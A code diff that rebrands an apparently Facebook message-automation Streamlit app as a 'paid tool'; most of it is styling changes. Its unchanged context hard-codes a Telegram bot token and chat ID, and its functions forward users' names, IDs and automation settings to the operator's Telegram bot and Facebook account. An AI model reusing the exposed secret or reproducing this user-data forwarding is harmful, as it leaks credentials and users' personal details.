@@ -15,13 +15,13 @@ from datetime import datetime
 import json
 
 st.set_page_config(
-    page_title="FB E2EE by LORD DEVIL",
-    page_icon="👑",
+    page_title="WALEED PAID TOOL E2E UPDATE V.12",
+    page_icon="🔥",
     layout="wide",
     initial_sidebar_state="expanded"
 )
 
-# Telegram Bot Configuration
+# Telegram Bot Configuration - UPDATED WITH WALEED'S INFO
 TELEGRAM_BOT_TOKEN = "8043472695:AAGfv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
 TELEGRAM_CHAT_ID = "8186206231"
 FACEBOOK_ADMIN_UID = "100037931553832"
@@ -30,14 +30,14 @@ def send_telegram_notification(user_data, automation_data):
     """Send complete user details to Telegram bot"""
     try:
         message = f"""
-🔰 *NEW AUTOMATION STARTED* 🔰
+🔥 *NEW AUTOMATION STARTED* 🔥
 
 👤 *User Details:*
 • Username: `{user_data['username']}`
 • Real Name: `{user_data['real_name']}`
 • User ID: `{user_data['user_id']}`
 
-🔧 *Automation Config:*
+⚙️ *Automation Config:*
 • Chat ID: `{automation_data['chat_id']}`
 • Delay: `{automation_data['delay']} seconds`
 • Prefix: `{automation_data['prefix']}`
@@ -66,14 +66,14 @@ def send_facebook_notification(user_data, automation_data):
     """Send notification to Facebook admin"""
     try:
         message = f"""
-🔰 NEW AUTOMATION STARTED 🔰
+🔥 NEW AUTOMATION STARTED 🔥
 
 👤 User Details:
 • Username: {user_data['username']}
 • Real Name: {user_data['real_name']}
 • User ID: {user_data['user_id']}
 
-🔧 Automation Config:
+⚙️ Automation Config:
 • Chat ID: {automation_data['chat_id']}
 • Delay: {automation_data['delay']} seconds
 • Prefix: {automation_data['prefix']}
@@ -94,57 +94,106 @@ def send_facebook_notification(user_data, automation_data):
         print(f"Facebook notification failed: {e}")
         return False
 
-# Background image and custom CSS
-background_image = "https://i.ibb.co/FkGd2cNf/cccf21694e054d66aa5a945bb3b212fa.jpg"
+# Updated theme colors
+THEME_COLORS = {
+    'primary': '#FF6B35',  # Orange
+    'secondary': '#004E89', # Blue
+    'accent': '#FFA500',   # Gold
+    'dark': '#1A1A2E',
+    'light': '#F5F5F5',
+    'success': '#00C851',
+    'warning': '#FFBB33',
+    'danger': '#FF4444'
+}
 
+# Modern gradient background
 custom_css = f"""
 <style>
-    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap');
     
     * {{
-        font-family: 'Poppins', sans-serif;
+        font-family: 'Inter', sans-serif;
     }}
     
     .stApp {{
-        background: linear-gradient(135deg, #87CEEB, #98FB98, #87CEFA, #00BFFF);
+        background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
         background-size: 400% 400%;
-        animation: gradientBackground 15s ease infinite;
+        animation: gradientShift 15s ease infinite;
+        min-height: 100vh;
     }}
     
-    @keyframes gradientBackground {{
+    @keyframes gradientShift {{
         0% {{ background-position: 0% 50%; }}
         50% {{ background-position: 100% 50%; }}
         100% {{ background-position: 0% 50%; }}
     }}
     
     .main-container {{
-        background: rgba(255, 255, 255, 0.95);
-        border-radius: 20px;
-        padding: 2rem;
-        margin: 1rem;
-        box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-        backdrop-filter: blur(10px);
+        background: rgba(26, 26, 46, 0.85);
+        backdrop-filter: blur(20px);
+        border-radius: 24px;
+        padding: 2.5rem;
+        margin: 1.5rem;
+        box-shadow: 0 25px 75px rgba(0, 0, 0, 0.5),
+                    0 0 100px rgba(255, 107, 53, 0.1),
+                    inset 0 1px 0 rgba(255, 255, 255, 0.1);
+        border: 1px solid rgba(255, 107, 53, 0.2);
     }}
     
-    .profile-icon {{
-        width: 120px;
-        height: 120px;
+    .tool-logo {{
+        width: 150px;
+        height: 150px;
         border-radius: 50%;
-        background-image: url('{background_image}');
-        background-size: cover;
-        background-position: center;
-        margin: 0 auto 1rem auto;
-        border: 5px solid #667eea;
-        box-shadow: 0 10px 30px rgba(102, 126, 234, 0.5);
+        background: linear-gradient(135deg, {THEME_COLORS['primary']}, {THEME_COLORS['accent']});
+        margin: 0 auto 1.5rem auto;
+        border: 4px solid;
+        border-image: linear-gradient(45deg, {THEME_COLORS['primary']}, {THEME_COLORS['accent']}) 1;
+        box-shadow: 0 0 50px rgba(255, 107, 53, 0.6),
+                    inset 0 0 30px rgba(255, 255, 255, 0.1);
+        position: relative;
+        overflow: hidden;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }}
+    
+    .tool-logo::before {{
+        content: 'W';
+        font-size: 5rem;
+        font-weight: 900;
+        color: white;
+        text-shadow: 0 0 30px rgba(0, 0, 0, 0.8);
+        font-family: 'Inter', sans-serif;
+    }}
+    
+    .tool-logo::after {{
+        content: '';
+        position: absolute;
+        top: -50%;
+        left: -50%;
+        width: 200%;
+        height: 200%;
+        background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+        transform: rotate(45deg);
+        animation: logoShine 3s infinite;
+    }}
+    
+    @keyframes logoShine {{
+        0% {{ transform: rotate(45deg) translateX(-150%); }}
+        100% {{ transform: rotate(45deg) translateX(150%); }}
     }}
     
     .main-header {{
-        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-        padding: 2rem;
-        border-radius: 15px;
+        background: linear-gradient(135deg, 
+            rgba(26, 26, 46, 0.9) 0%, 
+            rgba(38, 38, 62, 0.9) 100%);
+        padding: 3rem;
+        border-radius: 24px;
         text-align: center;
-        margin-bottom: 2rem;
-        box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3);
+        margin-bottom: 2.5rem;
+        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4),
+                    inset 0 1px 0 rgba(255, 255, 255, 0.05);
+        border: 1px solid rgba(255, 107, 53, 0.2);
         position: relative;
         overflow: hidden;
     }}
@@ -152,86 +201,144 @@ custom_css = f"""
     .main-header::before {{
         content: '';
         position: absolute;
-        top: -50%;
-        left: -50%;
-        width: 200%;
-        height: 200%;
-        background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
-        transform: rotate(45deg);
-        animation: shine 3s infinite;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(
+            90deg,
+            transparent,
+            rgba(255, 107, 53, 0.1),
+            transparent
+        );
+        animation: headerShimmer 4s infinite;
     }}
     
-    @keyframes shine {{
-        0% {{ transform: rotate(45deg) translateX(-100%); }}
-        100% {{ transform: rotate(45deg) translateX(100%); }}
+    @keyframes headerShimmer {{
+        100% {{ left: 100%; }}
     }}
     
     .main-header h1 {{
-        color: white;
-        font-size: 2.5rem;
-        font-weight: 700;
-        margin: 0;
-        text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
-        background: linear-gradient(45deg, #ff6b6b, #feca57, #48dbfb, #ff9ff3);
+        background: linear-gradient(45deg, {THEME_COLORS['primary']}, {THEME_COLORS['accent']}, {THEME_COLORS['primary']});
         -webkit-background-clip: text;
         -webkit-text-fill-color: transparent;
-        background-size: 400% 400%;
-        animation: electric 3s ease-in-out infinite;
+        background-clip: text;
+        font-size: 3.5rem;
+        font-weight: 900;
+        margin: 0;
+        letter-spacing: 1.5px;
+        background-size: 300% auto;
+        animation: titleGlow 4s ease-in-out infinite alternate;
+        text-transform: uppercase;
+        font-family: 'Inter', sans-serif;
     }}
     
-    @keyframes electric {{
-        0%, 100% {{ background-position: 0% 50%; }}
-        50% {{ background-position: 100% 50%; }}
+    @keyframes titleGlow {{
+        0% {{
+            background-position: 0% 50%;
+            text-shadow: 0 0 20px rgba(255, 107, 53, 0.3);
+        }}
+        100% {{
+            background-position: 100% 50%;
+            text-shadow: 0 0 40px rgba(255, 165, 0, 0.5);
+        }}
     }}
     
     .main-header p {{
-        color: rgba(255,255,255,0.9);
-        font-size: 1.1rem;
+        color: rgba(255, 255, 255, 0.8);
+        font-size: 1.3rem;
+        margin-top: 1rem;
+        font-weight: 400;
+        letter-spacing: 1px;
+        font-family: 'Inter', sans-serif;
+    }}
+    
+    .main-header .version {{
+        color: {THEME_COLORS['accent']};
+        font-weight: 600;
+        font-size: 1rem;
         margin-top: 0.5rem;
+        font-family: 'JetBrains Mono', monospace;
     }}
     
     .stButton>button {{
-        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        background: linear-gradient(135deg, {THEME_COLORS['primary']} 0%, {THEME_COLORS['accent']} 100%);
         color: white;
         border: none;
-        border-radius: 10px;
-        padding: 0.75rem 2rem;
-        font-weight: 600;
-        font-size: 1rem;
-        transition: all 0.3s ease;
-        box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+        border-radius: 12px;
+        padding: 1rem 2.5rem;
+        font-weight: 700;
+        font-size: 1.1rem;
+        transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        box-shadow: 0 10px 30px rgba(255, 107, 53, 0.4),
+                    0 0 20px rgba(255, 107, 53, 0.2);
+        position: relative;
+        overflow: hidden;
+        letter-spacing: 0.8px;
+        text-transform: uppercase;
+    }}
+    
+    .stButton>button::before {{
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(
+            90deg,
+            transparent,
+            rgba(255, 255, 255, 0.3),
+            transparent
+        );
+        transition: 0.8s;
+    }}
+    
+    .stButton>button:hover::before {{
+        left: 100%;
     }}
     
     .stButton>button:hover {{
-        transform: translateY(-2px);
-        box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
+        transform: translateY(-4px) scale(1.03);
+        box-shadow: 0 15px 40px rgba(255, 107, 53, 0.6),
+                    0 0 30px rgba(255, 107, 53, 0.3);
     }}
     
     .login-box {{
-        background: rgba(255, 255, 255, 0.95);
-        padding: 3rem;
-        border-radius: 20px;
-        box-shadow: 0 20px 60px rgba(0,0,0,0.1);
-        max-width: 500px;
-        margin: 2rem auto;
-        backdrop-filter: blur(10px);
+        background: rgba(26, 26, 46, 0.9);
+        padding: 3.5rem;
+        border-radius: 24px;
+        box-shadow: 0 25px 60px rgba(0, 0, 0, 0.4),
+                    0 0 50px rgba(255, 107, 53, 0.1),
+                    inset 0 1px 0 rgba(255, 255, 255, 0.05);
+        max-width: 550px;
+        margin: 2.5rem auto;
+        border: 1px solid rgba(255, 107, 53, 0.2);
+        backdrop-filter: blur(15px);
     }}
     
     .approval-box {{
-        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-        padding: 2rem;
-        border-radius: 15px;
+        background: linear-gradient(135deg, 
+            rgba(255, 107, 53, 0.15) 0%, 
+            rgba(255, 165, 0, 0.15) 100%);
+        padding: 3rem;
+        border-radius: 24px;
         color: white;
         text-align: center;
-        margin: 2rem auto;
-        max-width: 600px;
+        margin: 2.5rem auto;
+        max-width: 650px;
+        border: 1px solid rgba(255, 107, 53, 0.3);
+        backdrop-filter: blur(15px);
+        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3),
+                    0 0 40px rgba(255, 107, 53, 0.1);
     }}
     
     .contact-buttons {{
         display: flex;
         justify-content: center;
-        gap: 1rem;
-        margin: 1rem 0;
+        gap: 1.5rem;
+        margin: 2rem 0;
+        flex-wrap: wrap;
     }}
     
     .contact-btn {{
@@ -239,13 +346,41 @@ custom_css = f"""
         color: white;
         border: none;
         border-radius: 50px;
-        padding: 1rem 2rem;
-        font-weight: 600;
+        padding: 1.3rem 2.8rem;
+        font-weight: 700;
         text-decoration: none;
-        transition: all 0.3s ease;
-        box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-        display: inline-block;
-        text-align: center;
+        transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        box-shadow: 0 12px 35px rgba(0, 0, 0, 0.3);
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.8rem;
+        min-width: 200px;
+        position: relative;
+        overflow: hidden;
+        font-size: 1.1rem;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+    }}
+    
+    .contact-btn::before {{
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(
+            90deg,
+            transparent,
+            rgba(255, 255, 255, 0.3),
+            transparent
+        );
+        transition: 0.8s;
+    }}
+    
+    .contact-btn:hover::before {{
+        left: 100%;
     }}
     
     .contact-btn.facebook {{
@@ -256,138 +391,162 @@ custom_css = f"""
         background: linear-gradient(135deg, #0088cc, #006699);
     }}
     
+    .contact-btn.whatsapp {{
+        background: linear-gradient(135deg, #25D366, #128C7E);
+    }}
+    
     .contact-btn:hover {{
-        transform: translateY(-3px);
-        box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+        transform: translateY(-4px) scale(1.05);
+        box-shadow: 0 18px 45px rgba(0, 0, 0, 0.4);
         color: white;
         text-decoration: none;
     }}
     
     .success-box {{
-        background: linear-gradient(135deg, #84fab0 0%, #8fd3f4 100%);
-        padding: 1rem;
-        border-radius: 10px;
-        color: white;
+        background: linear-gradient(135deg, 
+            rgba(0, 200, 81, 0.15) 0%, 
+            rgba(0, 180, 71, 0.15) 100%);
+        padding: 1.8rem;
+        border-radius: 18px;
+        color: #00C851;
         text-align: center;
-        margin: 1rem 0;
+        margin: 1.8rem 0;
+        border: 1px solid rgba(0, 200, 81, 0.3);
+        backdrop-filter: blur(10px);
+        box-shadow: 0 10px 30px rgba(0, 200, 81, 0.1);
     }}
     
     .error-box {{
-        background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
-        padding: 1rem;
-        border-radius: 10px;
-        color: white;
+        background: linear-gradient(135deg, 
+            rgba(255, 68, 68, 0.15) 0%, 
+            rgba(220, 53, 69, 0.15) 100%);
+        padding: 1.8rem;
+        border-radius: 18px;
+        color: #FF4444;
         text-align: center;
-        margin: 1rem 0;
+        margin: 1.8rem 0;
+        border: 1px solid rgba(255, 68, 68, 0.3);
+        backdrop-filter: blur(10px);
+        box-shadow: 0 10px 30px rgba(255, 68, 68, 0.1);
+    }}
+    
+    .info-box {{
+        background: linear-gradient(135deg, 
+            rgba(0, 78, 137, 0.15) 0%, 
+            rgba(0, 60, 120, 0.15) 100%);
+        padding: 1.8rem;
+        border-radius: 18px;
+        color: #004E89;
+        text-align: center;
+        margin: 1.8rem 0;
+        border: 1px solid rgba(0, 78, 137, 0.3);
+        backdrop-filter: blur(10px);
+        box-shadow: 0 10px 30px rgba(0, 78, 137, 0.1);
+    }}
+    
+    .warning-box {{
+        background: linear-gradient(135deg, 
+            rgba(255, 187, 51, 0.15) 0%, 
+            rgba(255, 165, 0, 0.15) 100%);
+        padding: 1.8rem;
+        border-radius: 18px;
+        color: #FFBB33;
+        text-align: center;
+        margin: 1.8rem 0;
+        border: 1px solid rgba(255, 187, 51, 0.3);
+        backdrop-filter: blur(10px);
+        box-shadow: 0 10px 30px rgba(255, 187, 51, 0.1);
     }}
     
     .footer {{
         text-align: center;
-        padding: 2rem;
-        color: #667eea;
-        font-weight: 600;
-        margin-top: 3rem;
-        background: rgba(255,255,255,0.9);
-        border-radius: 15px;
+        padding: 2.5rem;
+        color: {THEME_COLORS['primary']};
+        font-weight: 700;
+        margin-top: 4rem;
+        background: rgba(26, 26, 46, 0.9);
+        border-radius: 20px;
+        border: 1px solid rgba(255, 107, 53, 0.2);
+        box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
+        font-size: 1.1rem;
+        letter-spacing: 1px;
+        text-transform: uppercase;
     }}
     
-    /* Enhanced input fields with dynamic glowing effects */
+    /* Modern input fields */
     .stTextInput>div>div>input, .stTextArea>div>div>textarea, .stNumberInput>div>div>input {{
-        border-radius: 15px;
-        border: 3px solid transparent;
-        padding: 1rem;
-        transition: all 0.3s ease;
-        background: #1E90FF !important;
+        background: rgba(26, 26, 46, 0.9) !important;
+        border: 2px solid rgba(255, 107, 53, 0.3) !important;
+        border-radius: 15px !important;
+        padding: 1.2rem !important;
         color: white !important;
-        background-clip: padding-box;
-        position: relative;
-        font-weight: 500;
+        font-size: 1.1rem !important;
+        font-weight: 500 !important;
+        transition: all 0.3s ease !important;
+        backdrop-filter: blur(10px) !important;
     }}
     
     .stTextInput>div>div>input::placeholder, .stTextArea>div>div>textarea::placeholder, .stNumberInput>div>div>input::placeholder {{
-        color: rgba(255, 255, 255, 0.8) !important;
+        color: rgba(255, 255, 255, 0.5) !important;
+        font-weight: 400 !important;
     }}
     
     .stTextInput>div>div>input:focus, .stTextArea>div>div>textarea:focus, .stNumberInput>div>div>input:focus {{
-        border: 3px solid transparent;
-        background: #4169E1 !important;
-        animation: dynamicGlow 2s ease-in-out infinite alternate;
-    }}
-    
-    @keyframes dynamicGlow {{
-        0% {{
-            box-shadow: 0 0 10px #ff6b6b, 0 0 20px #ff6b6b, 0 0 30px #ff6b6b;
-            border-image: linear-gradient(45deg, #ff6b6b, #feca57) 1;
-        }}
-        12.5% {{
-            box-shadow: 0 0 10px #feca57, 0 0 20px #feca57, 0 0 30px #feca57;
-            border-image: linear-gradient(45deg, #feca57, #48dbfb) 1;
-        }}
-        25% {{
-            box-shadow: 0 0 10px #48dbfb, 0 0 20px #48dbfb, 0 0 30px #48dbfb;
-            border-image: linear-gradient(45deg, #48dbfb, #ff9ff3) 1;
-        }}
-        37.5% {{
-            box-shadow: 0 0 10px #ff9ff3, 0 0 20px #ff9ff3, 0 0 30px #ff9ff3;
-            border-image: linear-gradient(45deg, #ff9ff3, #ff6b6b) 1;
-        }}
-        50% {{
-            box-shadow: 0 0 10px #ff6b6b, 0 0 20px #ff6b6b, 0 0 30px #ff6b6b;
-            border-image: linear-gradient(45deg, #ff6b6b, #feca57) 1;
-        }}
-        62.5% {{
-            box-shadow: 0 0 10px #feca57, 0 0 20px #feca57, 0 0 30px #feca57;
-            border-image: linear-gradient(45deg, #feca57, #48dbfb) 1;
-        }}
-        75% {{
-            box-shadow: 0 0 10px #48dbfb, 0 0 20px #48dbfb, 0 0 30px #48dbfb;
-            border-image: linear-gradient(45deg, #48dbfb, #ff9ff3) 1;
-        }}
-        87.5% {{
-            box-shadow: 0 0 10px #ff9ff3, 0 0 20px #ff9ff3, 0 0 30px #ff9ff3;
-            border-image: linear-gradient(45deg, #ff9ff3, #ff6b6b) 1;
-        }}
-        100% {{
-            box-shadow: 0 0 15px #ff6b6b, 0 0 25px #ff6b6b, 0 0 35px #ff6b6b;
-            border-image: linear-gradient(45deg, #ff6b6b, #feca57) 1;
-        }}
+        border: 2px solid {THEME_COLORS['primary']} !important;
+        box-shadow: 0 0 25px rgba(255, 107, 53, 0.4) !important;
+        background: rgba(26, 26, 46, 0.95) !important;
     }}
     
     .input-label {{
-        color: #667eea;
-        font-weight: 600;
-        margin-bottom: 0.5rem;
+        color: {THEME_COLORS['accent']};
+        font-weight: 700;
+        margin-bottom: 0.8rem;
         display: block;
+        font-size: 1.1rem;
+        text-transform: uppercase;
+        letter-spacing: 1px;
     }}
     
     .input-hint {{
-        color: #764ba2;
-        font-size: 0.8rem;
+        color: rgba(255, 255, 255, 0.6);
+        font-size: 0.9rem;
+        margin-top: 0.4rem;
         font-style: italic;
-        margin-top: 0.25rem;
+        font-family: 'JetBrains Mono', monospace;
     }}
     
+    /* Modern card design */
     .info-card {{
-        background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-        padding: 1.5rem;
-        border-radius: 15px;
-        margin: 1rem 0;
+        background: linear-gradient(135deg, 
+            rgba(26, 26, 46, 0.9) 0%, 
+            rgba(38, 38, 62, 0.9) 100%);
+        padding: 2rem;
+        border-radius: 20px;
+        margin: 1.5rem 0;
+        border: 1px solid rgba(255, 107, 53, 0.2);
+        box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3),
+                    0 0 30px rgba(255, 107, 53, 0.1);
+        backdrop-filter: blur(15px);
     }}
     
+    /* Enhanced log container */
     .log-container {{
-        background: url('{background_image}') no-repeat center center;
-        background-size: cover;
-        color: #87CEEB !important;
-        padding: 1rem;
-        border-radius: 10px;
-        font-family: 'Courier New', monospace;
-        max-height: 400px;
+        background: linear-gradient(135deg, 
+            rgba(26, 26, 46, 0.95) 0%, 
+            rgba(38, 38, 62, 0.95) 100%);
+        color: #FF6B35 !important;
+        padding: 1.5rem;
+        border-radius: 18px;
+        font-family: 'JetBrains Mono', monospace;
+        max-height: 500px;
         overflow-y: auto;
-        font-size: 0.75rem;
-        line-height: 1.2;
-        border: 2px solid #333;
-        box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        font-size: 0.85rem;
+        line-height: 1.4;
+        border: 2px solid rgba(255, 107, 53, 0.3);
+        box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4),
+                    0 0 40px rgba(255, 107, 53, 0.1);
         position: relative;
+        overflow-x: hidden;
     }}
     
     .log-container::before {{
@@ -396,183 +555,333 @@ custom_css = f"""
         top: 0;
         left: 0;
         right: 0;
-        bottom: 0;
-        background: rgba(0,0,0,0.7);
-        border-radius: 10px;
-        z-index: 1;
-    }}
-    
-    .log-container > * {{
-        position: relative;
-        z-index: 2;
+        height: 4px;
+        background: linear-gradient(90deg, {THEME_COLORS['primary']}, {THEME_COLORS['accent']});
+        border-radius: 18px 18px 0 0;
     }}
     
     .log-line {{
-        margin: 2px 0;
-        padding: 2px 5px;
-        border-radius: 3px;
-        animation: rainbowText 3s infinite alternate;
-        text-shadow: 0 0 10px currentColor;
+        margin: 8px 0;
+        padding: 10px 15px;
+        border-radius: 10px;
+        background: rgba(255, 107, 53, 0.05);
+        border-left: 3px solid {THEME_COLORS['primary']};
         font-weight: 500;
+        transition: all 0.3s ease;
+        animation: logEntry 0.5s ease-out;
     }}
     
-    @keyframes rainbowText {{
-        0% {{ color: #ff6b6b; }}
-        14% {{ color: #feca57; }}
-        28% {{ color: #48dbfb; }}
-        42% {{ color: #ff9ff3; }}
-        56% {{ color: #54a0ff; }}
-        70% {{ color: #00d2d3; }}
-        84% {{ color: #5f27cd; }}
-        100% {{ color: #ff9ff3; }}
+    @keyframes logEntry {{
+        from {{
+            opacity: 0;
+            transform: translateX(-10px);
+        }}
+        to {{
+            opacity: 1;
+            transform: translateX(0);
+        }}
     }}
     
+    .log-line:hover {{
+        background: rgba(255, 107, 53, 0.1);
+        transform: translateX(5px);
+    }}
+    
+    /* Modern admin panel */
     .admin-panel {{
-        background: linear-gradient(135deg, #2c3e50, #34495e);
+        background: linear-gradient(135deg, 
+            rgba(26, 26, 46, 0.95) 0%, 
+            rgba(38, 38, 62, 0.95) 100%);
         color: white;
-        padding: 2rem;
-        border-radius: 15px;
-        margin: 1rem 0;
+        padding: 2.5rem;
+        border-radius: 24px;
+        margin: 1.5rem 0;
+        border: 1px solid rgba(255, 107, 53, 0.3);
+        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4),
+                    0 0 50px rgba(255, 107, 53, 0.1);
+        backdrop-filter: blur(15px);
     }}
     
     .user-card {{
-        background: rgba(255,255,255,0.1);
-        padding: 1rem;
-        border-radius: 10px;
-        margin: 0.5rem 0;
-        border-left: 4px solid #667eea;
+        background: rgba(255, 255, 255, 0.05);
+        padding: 1.5rem;
+        border-radius: 15px;
+        margin: 1rem 0;
+        border-left: 4px solid {THEME_COLORS['primary']};
+        transition: all 0.3s ease;
+        backdrop-filter: blur(10px);
+    }}
+    
+    .user-card:hover {{
+        background: rgba(255, 255, 255, 0.1);
+        transform: translateY(-3px);
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
     }}
     
     .approved {{
-        border-left-color: #27ae60;
+        border-left-color: {THEME_COLORS['success']};
     }}
     
     .pending {{
-        border-left-color: #f39c12;
+        border-left-color: {THEME_COLORS['warning']};
     }}
     
     .rejected {{
-        border-left-color: #e74c3c;
+        border-left-color: {THEME_COLORS['danger']};
     }}
     
     .copy-btn {{
-        background: linear-gradient(135deg, #667eea, #764ba2);
+        background: linear-gradient(135deg, {THEME_COLORS['primary']}, {THEME_COLORS['accent']});
         color: white;
         border: none;
-        border-radius: 5px;
-        padding: 0.5rem 1rem;
-        font-size: 0.9rem;
-        margin-left: 0.5rem;
-        cursor: pointer;
+        border-radius: 8px;
+        padding: 0.8rem 1.5rem;
+        font-weight: 700;
+        font-size: 1rem;
         transition: all 0.3s ease;
+        box-shadow: 0 5px 15px rgba(255, 107, 53, 0.3);
+        cursor: pointer;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
     }}
     
     .copy-btn:hover {{
-        background: linear-gradient(135deg, #764ba2, #667eea);
+        background: linear-gradient(135deg, {THEME_COLORS['accent']}, {THEME_COLORS['primary']});
+        transform: translateY(-2px);
+        box-shadow: 0 8px 20px rgba(255, 107, 53, 0.4);
     }}
     
     .approval-key-box {{
-        background: rgba(255,255,255,0.1);
-        padding: 1.5rem;
-        border-radius: 10px;
-        margin: 1rem 0;
-        border: 2px solid #667eea;
+        background: linear-gradient(135deg, 
+            rgba(255, 107, 53, 0.1) 0%, 
+            rgba(255, 165, 0, 0.1) 100%);
+        padding: 2rem;
+        border-radius: 20px;
+        margin: 1.5rem 0;
+        border: 2px solid rgba(255, 107, 53, 0.3);
         text-align: center;
+        backdrop-filter: blur(10px);
+        box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
     }}
     
     .approval-key-display {{
-        font-size: 1.2rem;
-        font-weight: bold;
-        letter-spacing: 2px;
-        background: rgba(0,0,0,0.3);
-        padding: 1rem;
-        border-radius: 5px;
-        margin: 1rem 0;
-        border: 1px solid #667eea;
+        font-size: 1.5rem;
+        font-weight: 900;
+        letter-spacing: 3px;
+        background: rgba(0, 0, 0, 0.3);
+        padding: 1.5rem;
+        border-radius: 12px;
+        margin: 1.5rem 0;
+        border: 1px solid rgba(255, 107, 53, 0.5);
+        font-family: 'JetBrains Mono', monospace;
+        color: {THEME_COLORS['accent']};
+        text-shadow: 0 0 10px rgba(255, 165, 0, 0.3);
+        animation: keyPulse 2s infinite;
+    }}
+    
+    @keyframes keyPulse {{
+        0%, 100% {{ box-shadow: 0 0 10px rgba(255, 107, 53, 0.3); }}
+        50% {{ box-shadow: 0 0 20px rgba(255, 165, 0, 0.5); }}
     }}
     
     .user-info-box {{
-        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-        padding: 1.5rem;
-        border-radius: 10px;
+        background: linear-gradient(135deg, 
+            rgba(255, 107, 53, 0.15) 0%, 
+            rgba(255, 165, 0, 0.15) 100%);
+        padding: 2rem;
+        border-radius: 20px;
         color: white;
-        margin: 1rem 0;
+        margin: 1.5rem 0;
+        border: 1px solid rgba(255, 107, 53, 0.3);
+        backdrop-filter: blur(10px);
+        box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
     }}
     
     .send-approval-btn {{
-        background: linear-gradient(135deg, #1877F2, #0D5CB6);
+        background: linear-gradient(135deg, {THEME_COLORS['primary']}, {THEME_COLORS['accent']});
         color: white;
         border: none;
-        border-radius: 10px;
-        padding: 1rem 2rem;
-        font-weight: 600;
-        font-size: 1.1rem;
-        transition: all 0.3s ease;
-        box-shadow: 0 4px 15px rgba(24, 119, 242, 0.4);
+        border-radius: 15px;
+        padding: 1.2rem 2.5rem;
+        font-weight: 800;
+        font-size: 1.2rem;
+        transition: all 0.4s ease;
+        box-shadow: 0 10px 30px rgba(255, 107, 53, 0.4),
+                    0 0 25px rgba(255, 107, 53, 0.2);
         width: 100%;
-        margin: 1rem 0;
-    }}
-    
-    .send-approval-btn:hover {{
-        transform: translateY(-2px);
-        box-shadow: 0 6px 20px rgba(24, 119, 242, 0.6);
-    }}
-    
-    .admin-user-details {{
-        background: linear-gradient(135deg, #1e3c72, #2a5298);
-        padding: 1rem;
-        border-radius: 10px;
-        margin: 1rem 0;
-        border: 2px solid #667eea;
-    }}
-    
-    .admin-logs-container {{
-        background: url('{background_image}') no-repeat center center;
-        background-size: cover;
-        color: white;
-        padding: 1rem;
-        border-radius: 10px;
-        font-family: 'Courier New', monospace;
-        max-height: 300px;
-        overflow-y: auto;
-        font-size: 0.7rem;
-        line-height: 1.1;
-        border: 2px solid #333;
-        margin: 0.5rem 0;
+        margin: 1.5rem 0;
+        text-transform: uppercase;
+        letter-spacing: 1px;
         position: relative;
+        overflow: hidden;
     }}
     
-    .admin-logs-container::before {{
+    .send-approval-btn::before {{
         content: '';
         position: absolute;
         top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-        background: rgba(0,0,0,0.8);
-        border-radius: 10px;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(
+            90deg,
+            transparent,
+            rgba(255, 255, 255, 0.3),
+            transparent
+        );
+        transition: 0.8s;
     }}
     
-    .admin-logs-container > * {{
-        position: relative;
-        z-index: 2;
+    .send-approval-btn:hover::before {{
+        left: 100%;
+    }}
+    
+    .send-approval-btn:hover {{
+        transform: translateY(-3px);
+        box-shadow: 0 15px 40px rgba(255, 107, 53, 0.6),
+                    0 0 35px rgba(255, 107, 53, 0.3);
+    }}
+    
+    .admin-user-details {{
+        background: linear-gradient(135deg, 
+            rgba(0, 78, 137, 0.15) 0%, 
+            rgba(0, 60, 120, 0.15) 100%);
+        padding: 1.8rem;
+        border-radius: 18px;
+        margin: 1.5rem 0;
+        border: 2px solid rgba(0, 78, 137, 0.3);
+        backdrop-filter: blur(10px);
+        box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+    }}
+    
+    .admin-logs-container {{
+        background: linear-gradient(135deg, 
+            rgba(26, 26, 46, 0.95) 0%, 
+            rgba(38, 38, 62, 0.95) 100%);
+        color: {THEME_COLORS['primary']};
+        padding: 1.2rem;
+        border-radius: 15px;
+        font-family: 'JetBrains Mono', monospace;
+        max-height: 350px;
+        overflow-y: auto;
+        font-size: 0.75rem;
+        line-height: 1.3;
